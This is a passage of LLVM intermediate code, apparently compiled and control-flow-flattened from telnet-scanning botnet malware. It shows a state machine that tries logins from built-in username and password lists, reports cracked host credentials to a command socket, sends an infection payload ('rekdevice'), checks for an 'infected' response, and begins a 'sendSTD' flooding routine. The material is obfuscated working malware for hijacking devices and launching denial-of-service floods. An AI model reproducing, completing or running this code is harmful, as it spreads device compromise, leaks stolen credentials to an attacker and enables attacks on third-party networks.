  %559 = load i32, i32* %5, align 4
  %560 = sext i32 %559 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 9
  %563 = load i8*, i8** %562, align 8
  %564 = call i32 @read_until_response(i32 %557, i32 %558, i8* %563, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %565 = icmp ne i32 %564, 0
  %566 = select i1 %565, i32 -1313717765, i32 -2038159347
  store i32 %566, i32* %switchVar
  br label %loopEnd

; <label>:567:                                    ; preds = %loopEntry
  %568 = call i64 @time(i64* null) #2
  %569 = trunc i64 %568 to i32
  %570 = load i32, i32* %5, align 4
  %571 = sext i32 %570 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %571
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %572, i32 0, i32 7
  store i32 %569, i32* %573, align 16
  %574 = load i32, i32* %5, align 4
  %575 = sext i32 %574 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 9
  %578 = load i8*, i8** %577, align 8
  %579 = call i32 @contains_fail(i8* %578)
  %580 = icmp ne i32 %579, 0
  %581 = select i1 %580, i32 -1784305078, i32 174298723
  store i32 %581, i32* %switchVar
  br label %loopEnd

; <label>:582:                                    ; preds = %loopEntry
  %583 = load i32, i32* %5, align 4
  %584 = sext i32 %583 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %584
  call void @advance_telstate(%struct.telstate_t* %585, i32 0)
  store i32 -543915230, i32* %switchVar
  br label %loopEnd

; <label>:586:                                    ; preds = %loopEntry
  %587 = load i32, i32* %5, align 4
  %588 = sext i32 %587 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 9
  %591 = load i8*, i8** %590, align 8
  %592 = call i32 @contains_success(i8* %591)
  %593 = icmp ne i32 %592, 0
  %594 = select i1 %593, i32 789827097, i32 871656372
  store i32 %594, i32* %switchVar
  br label %loopEnd

; <label>:595:                                    ; preds = %loopEntry
  %596 = load i32, i32* %5, align 4
  %597 = sext i32 %596 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %597
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %598, i32 0, i32 3
  %600 = load i8, i8* %599, align 1
  %601 = zext i8 %600 to i32
  %602 = icmp eq i32 %601, 2
  %603 = select i1 %602, i32 212444231, i32 1115822193
  store i32 %603, i32* %switchVar
  br label %loopEnd

; <label>:604:                                    ; preds = %loopEntry
  %605 = load i32, i32* %5, align 4
  %606 = sext i32 %605 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %606
  call void @advance_telstate(%struct.telstate_t* %607, i32 7)
  store i32 -1388509337, i32* %switchVar
  br label %loopEnd

; <label>:608:                                    ; preds = %loopEntry
  %609 = load i32, i32* @mainCommSock, align 4
  %610 = load i32, i32* %5, align 4
  %611 = sext i32 %610 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %611
  %613 = call i8* @get_telstate_host(%struct.telstate_t* %612)
  %614 = load i32, i32* %5, align 4
  %615 = sext i32 %614 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %615
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %616, i32 0, i32 4
  %618 = load i8, i8* %617, align 2
  %619 = zext i8 %618 to i64
  %620 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %619
  %621 = load i8*, i8** %620, align 8
  %622 = load i32, i32* %5, align 4
  %623 = sext i32 %622 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %623
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %624, i32 0, i32 5
  %626 = load i8, i8* %625, align 1
  %627 = zext i8 %626 to i64
  %628 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %627
  %629 = load i8*, i8** %628, align 8
  %630 = call i32 (i32, i8*, ...) @sockprintf(i32 %609, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.315, i32 0, i32 0), i8* %613, i8* %621, i8* %629)
  %631 = load i32, i32* %5, align 4
  %632 = sext i32 %631 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %632
  call void @advance_telstate(%struct.telstate_t* %633, i32 7)
  store i32 -1388509337, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  store i32 2012945218, i32* %switchVar
  br label %loopEnd

; <label>:635:                                    ; preds = %loopEntry
  %636 = load i32, i32* %5, align 4
  %637 = sext i32 %636 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %637
  call void @reset_telstate(%struct.telstate_t* %638)
  store i32 2012945218, i32* %switchVar
  br label %loopEnd

; <label>:639:                                    ; preds = %loopEntry
  store i32 -543915230, i32* %switchVar
  br label %loopEnd

; <label>:640:                                    ; preds = %loopEntry
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:641:                                    ; preds = %loopEntry
  %642 = load i32, i32* %5, align 4
  %643 = sext i32 %642 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %643
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %644, i32 0, i32 7
  %646 = load i32, i32* %645, align 16
  %647 = add i32 %646, 7
  %648 = zext i32 %647 to i64
  %649 = call i64 @time(i64* null) #2
  %650 = icmp slt i64 %648, %649
  %651 = select i1 %650, i32 -618491504, i32 -1796773796
  store i32 %651, i32* %switchVar
  br label %loopEnd

; <label>:652:                                    ; preds = %loopEntry
  %653 = load i32, i32* %5, align 4
  %654 = sext i32 %653 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %654
  call void @reset_telstate(%struct.telstate_t* %655)
  store i32 -1796773796, i32* %switchVar
  br label %loopEnd

; <label>:656:                                    ; preds = %loopEntry
  store i32 1209094734, i32* %switchVar
  br label %loopEnd

; <label>:657:                                    ; preds = %loopEntry
  %658 = call i64 @time(i64* null) #2
  %659 = trunc i64 %658 to i32
  %660 = load i32, i32* %5, align 4
  %661 = sext i32 %660 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 7
  store i32 %659, i32* %663, align 16
  %664 = load i32, i32* %5, align 4
  %665 = sext i32 %664 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 0
  %668 = load i32, i32* %667, align 16
  %669 = call i64 @send(i32 %668, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.316, i32 0, i32 0), i64 8, i32 16384)
  %670 = icmp slt i64 %669, 0
  %671 = select i1 %670, i32 581875367, i32 2124573678
  store i32 %671, i32* %switchVar
  br label %loopEnd

; <label>:672:                                    ; preds = %loopEntry
  %673 = load i32, i32* %5, align 4
  %674 = sext i32 %673 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 0
  %677 = load i32, i32* %676, align 16
  %678 = call i32 @sclose(i32 %677)
  %679 = load i32, i32* %5, align 4
  %680 = sext i32 %679 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %680
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %681, i32 0, i32 2
  store i8 0, i8* %682, align 8
  %683 = load i32, i32* %5, align 4
  %684 = sext i32 %683 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %685, i32 0, i32 3
  store i8 1, i8* %686, align 1
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  %688 = load i32, i32* %5, align 4
  %689 = sext i32 %688 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %689
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %690, i32 0, i32 0
  %692 = load i32, i32* %691, align 16
  %693 = call i64 @send(i32 %692, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i32 0, i32 0), i64 8, i32 16384)
  %694 = icmp slt i64 %693, 0
  %695 = select i1 %694, i32 1990081132, i32 2059303184
  store i32 %695, i32* %switchVar
  br label %loopEnd

; <label>:696:                                    ; preds = %loopEntry
  %697 = load i32, i32* %5, align 4
  %698 = sext i32 %697 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %698
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %699, i32 0, i32 0
  %701 = load i32, i32* %700, align 16
  %702 = call i32 @sclose(i32 %701)
  %703 = load i32, i32* %5, align 4
  %704 = sext i32 %703 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %704
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %705, i32 0, i32 2
  store i8 0, i8* %706, align 8
  %707 = load i32, i32* %5, align 4
  %708 = sext i32 %707 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %708
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %709, i32 0, i32 3
  store i8 1, i8* %710, align 1
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:711:                                    ; preds = %loopEntry
  %712 = load i32, i32* %5, align 4
  %713 = sext i32 %712 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %713
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %714, i32 0, i32 0
  %716 = load i32, i32* %715, align 16
  %717 = call i64 @send(i32 %716, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.318, i32 0, i32 0), i64 7, i32 16384)
  %718 = icmp slt i64 %717, 0
  %719 = select i1 %718, i32 1418191384, i32 1079245805
  store i32 %719, i32* %switchVar
  br label %loopEnd

; <label>:720:                                    ; preds = %loopEntry
  %721 = load i32, i32* %5, align 4
  %722 = sext i32 %721 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %722
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %723, i32 0, i32 0
  %725 = load i32, i32* %724, align 16
  %726 = call i32 @sclose(i32 %725)
  %727 = load i32, i32* %5, align 4
  %728 = sext i32 %727 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %728
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %729, i32 0, i32 2
  store i8 0, i8* %730, align 8
  %731 = load i32, i32* %5, align 4
  %732 = sext i32 %731 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %732
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %733, i32 0, i32 3
  store i8 1, i8* %734, align 1
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:735:                                    ; preds = %loopEntry
  %736 = load i32, i32* %5, align 4
  %737 = sext i32 %736 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %737
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %738, i32 0, i32 0
  %740 = load i32, i32* %739, align 16
  %741 = call i64 @send(i32 %740, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.319, i32 0, i32 0), i64 4, i32 16384)
  %742 = icmp slt i64 %741, 0
  %743 = select i1 %742, i32 -985797484, i32 164147903
  store i32 %743, i32* %switchVar
  br label %loopEnd

; <label>:744:                                    ; preds = %loopEntry
  %745 = load i32, i32* %5, align 4
  %746 = sext i32 %745 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %746
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %747, i32 0, i32 0
  %749 = load i32, i32* %748, align 16
  %750 = call i32 @sclose(i32 %749)
  %751 = load i32, i32* %5, align 4
  %752 = sext i32 %751 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 2
  store i8 0, i8* %754, align 8
  %755 = load i32, i32* %5, align 4
  %756 = sext i32 %755 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %756
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %757, i32 0, i32 3
  store i8 1, i8* %758, align 1
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:759:                                    ; preds = %loopEntry
  %760 = load i32, i32* %5, align 4
  %761 = sext i32 %760 to i64
  %.reload36 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload36, i64 %761
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %762, i32 0, i32 0
  %764 = load i32, i32* %763, align 16
  %765 = call i64 @send(i32 %764, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.320, i32 0, i32 0), i64 26, i32 16384)
  %766 = icmp slt i64 %765, 0
  %767 = select i1 %766, i32 397850966, i32 -1944219957
  store i32 %767, i32* %switchVar
  br label %loopEnd

; <label>:768:                                    ; preds = %loopEntry
  %769 = load i32, i32* %5, align 4
  %770 = sext i32 %769 to i64
  %.reload35 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload35, i64 %770
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %771, i32 0, i32 0
  %773 = load i32, i32* %772, align 16
  %774 = call i32 @sclose(i32 %773)
  %775 = load i32, i32* %5, align 4
  %776 = sext i32 %775 to i64
  %.reload34 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload34, i64 %776
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %777, i32 0, i32 2
  store i8 0, i8* %778, align 8
  %779 = load i32, i32* %5, align 4
  %780 = sext i32 %779 to i64
  %.reload33 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload33, i64 %780
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %781, i32 0, i32 3
  store i8 1, i8* %782, align 1
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:783:                                    ; preds = %loopEntry
  %784 = load i32, i32* %5, align 4
  %785 = sext i32 %784 to i64
  %.reload32 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload32, i64 %785
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %786, i32 0, i32 0
  %788 = load i32, i32* %787, align 16
  %789 = load i32, i32* %3, align 4
  %790 = load i32, i32* %5, align 4
  %791 = sext i32 %790 to i64
  %.reload31 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload31, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 9
  %794 = load i8*, i8** %793, align 8
  %795 = call i32 @read_until_response(i32 %788, i32 %789, i8* %794, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @legit, i32 0, i32 0))
  %796 = icmp ne i32 %795, 0
  %797 = select i1 %796, i32 -1548794592, i32 821280769
  store i32 %797, i32* %switchVar
  br label %loopEnd

; <label>:798:                                    ; preds = %loopEntry
  %799 = load i32, i32* %5, align 4
  %800 = sext i32 %799 to i64
  %.reload30 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload30, i64 %800
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %801, i32 0, i32 0
  %803 = load i32, i32* %802, align 16
  %804 = load i8*, i8** @rekdevice, align 8
  %805 = load i8*, i8** @rekdevice, align 8
  %806 = call i64 @strlen(i8* %805) #10
  %807 = call i64 @send(i32 %803, i8* %804, i64 %806, i32 16384)
  %808 = icmp sgt i64 %807, 0
  %809 = select i1 %808, i32 1695397765, i32 -571175732
  store i32 %809, i32* %switchVar
  br label %loopEnd

; <label>:810:                                    ; preds = %loopEntry
  %811 = load i32, i32* %5, align 4
  %812 = sext i32 %811 to i64
  %.reload29 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload29, i64 %812
  call void @reset_telstate(%struct.telstate_t* %813)
  store i32 -571175732, i32* %switchVar
  br label %loopEnd

; <label>:814:                                    ; preds = %loopEntry
  %815 = call i32 @sleep(i32 20)
  %816 = load i32, i32* %5, align 4
  %817 = sext i32 %816 to i64
  %.reload28 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload28, i64 %817
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %818, i32 0, i32 0
  %820 = load i32, i32* %819, align 16
  %821 = load i32, i32* %3, align 4
  %822 = load i32, i32* %5, align 4
  %823 = sext i32 %822 to i64
  %.reload27 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload27, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 9
  %826 = load i8*, i8** %825, align 8
  %827 = call i32 @read_until_response(i32 %820, i32 %821, i8* %826, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @infected, i32 0, i32 0))
  %828 = icmp ne i32 %827, 0
  %829 = select i1 %828, i32 936548072, i32 -1750568649
  store i32 %829, i32* %switchVar
  br label %loopEnd

; <label>:830:                                    ; preds = %loopEntry
  %831 = load i32, i32* @mainCommSock, align 4
  %832 = load i32, i32* %5, align 4
  %833 = sext i32 %832 to i64
  %.reload26 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload26, i64 %833
  %835 = call i8* @get_telstate_host(%struct.telstate_t* %834)
  %836 = load i32, i32* %5, align 4
  %837 = sext i32 %836 to i64
  %.reload25 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload25, i64 %837
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %838, i32 0, i32 4
  %840 = load i8, i8* %839, align 2
  %841 = zext i8 %840 to i64
  %842 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %841
  %843 = load i8*, i8** %842, align 8
  %844 = load i32, i32* %5, align 4
  %845 = sext i32 %844 to i64
  %.reload24 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload24, i64 %845
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %846, i32 0, i32 5
  %848 = load i8, i8* %847, align 1
  %849 = zext i8 %848 to i64
  %850 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %849
  %851 = load i8*, i8** %850, align 8
  %852 = call i32 (i32, i8*, ...) @sockprintf(i32 %831, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.321, i32 0, i32 0), i8* %835, i8* %843, i8* %851)
  %853 = load i32, i32* %5, align 4
  %854 = sext i32 %853 to i64
  %.reload23 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload23, i64 %854
  call void @reset_telstate(%struct.telstate_t* %855)
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:856:                                    ; preds = %loopEntry
  %857 = load i32, i32* %5, align 4
  %858 = sext i32 %857 to i64
  %.reload22 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload22, i64 %858
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %859, i32 0, i32 7
  %861 = load i32, i32* %860, align 16
  %862 = add i32 %861, 60
  %863 = zext i32 %862 to i64
  %864 = call i64 @time(i64* null) #2
  %865 = icmp slt i64 %863, %864
  %866 = select i1 %865, i32 2009396334, i32 -832619718
  store i32 %866, i32* %switchVar
  br label %loopEnd

; <label>:867:                                    ; preds = %loopEntry
  %868 = load i32, i32* %5, align 4
  %869 = sext i32 %868 to i64
  %.reload21 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload21, i64 %869
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %870, i32 0, i32 3
  %872 = load i8, i8* %871, align 1
  %873 = zext i8 %872 to i32
  %874 = icmp ne i32 %873, 3
  %875 = select i1 %874, i32 -2099244405, i32 -1468906459
  store i32 %875, i32* %switchVar
  br label %loopEnd

; <label>:876:                                    ; preds = %loopEntry
  %877 = load i32, i32* @mainCommSock, align 4
  %878 = load i32, i32* %5, align 4
  %879 = sext i32 %878 to i64
  %.reload20 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload20, i64 %879
  %881 = call i8* @get_telstate_host(%struct.telstate_t* %880)
  %882 = load i32, i32* %5, align 4
  %883 = sext i32 %882 to i64
  %.reload19 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload19, i64 %883
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %884, i32 0, i32 4
  %886 = load i8, i8* %885, align 2
  %887 = zext i8 %886 to i64
  %888 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %887
  %889 = load i8*, i8** %888, align 8
  %890 = load i32, i32* %5, align 4
  %891 = sext i32 %890 to i64
  %.reload18 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload18, i64 %891
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %892, i32 0, i32 5
  %894 = load i8, i8* %893, align 1
  %895 = zext i8 %894 to i64
  %896 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %895
  %897 = load i8*, i8** %896, align 8
  %898 = call i32 (i32, i8*, ...) @sockprintf(i32 %877, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.322, i32 0, i32 0), i8* %881, i8* %889, i8* %897)
  store i32 -1468906459, i32* %switchVar
  br label %loopEnd

; <label>:899:                                    ; preds = %loopEntry
  %900 = load i32, i32* %5, align 4
  %901 = sext i32 %900 to i64
  %.reload17 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload17, i64 %901
  call void @reset_telstate(%struct.telstate_t* %902)
  store i32 -832619718, i32* %switchVar
  br label %loopEnd

; <label>:903:                                    ; preds = %loopEntry
  store i32 821280769, i32* %switchVar
  br label %loopEnd

; <label>:904:                                    ; preds = %loopEntry
  store i32 1209094734, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1209094734, i32* %switchVar
  br label %loopEnd

; <label>:905:                                    ; preds = %loopEntry
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:906:                                    ; preds = %loopEntry
  %907 = load i32, i32* %5, align 4
  %908 = add nsw i32 %907, 1
  store i32 %908, i32* %5, align 4
  store i32 -1064572083, i32* %switchVar
  br label %loopEnd

; <label>:909:                                    ; preds = %loopEntry
  store i32 1704952813, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %909, %906, %905, %NewDefault, %904, %903, %899, %876, %867, %856, %830, %814, %810, %798, %783, %768, %759, %744, %735, %720, %711, %696, %687, %672, %657, %656, %652, %641, %640, %639, %635, %634, %608, %604, %595, %586, %582, %567, %552, %548, %544, %535, %531, %505, %504, %500, %489, %488, %484, %480, %471, %456, %452, %448, %439, %435, %409, %408, %404, %393, %392, %388, %384, %375, %360, %359, %355, %344, %343, %339, %335, %334, %317, %313, %302, %268, %267, %258, %257, %256, %252, %248, %243, %217, %216, %191, %190, %189, %184, %175, %170, %149, %140, %120, %111, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %95, %88, %80, %75, %74, %73, %72, %69, %55, %50, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i64, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca [12 x i8], align 1
  %18 = alloca [78 x i8*], align 16
  %19 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %11, align 4
  %20 = call i64 @time(i64* null) #2
  store i64 %20, i64* %14, align 8
  %21 = call noalias i8* @malloc(i64 1024) #2
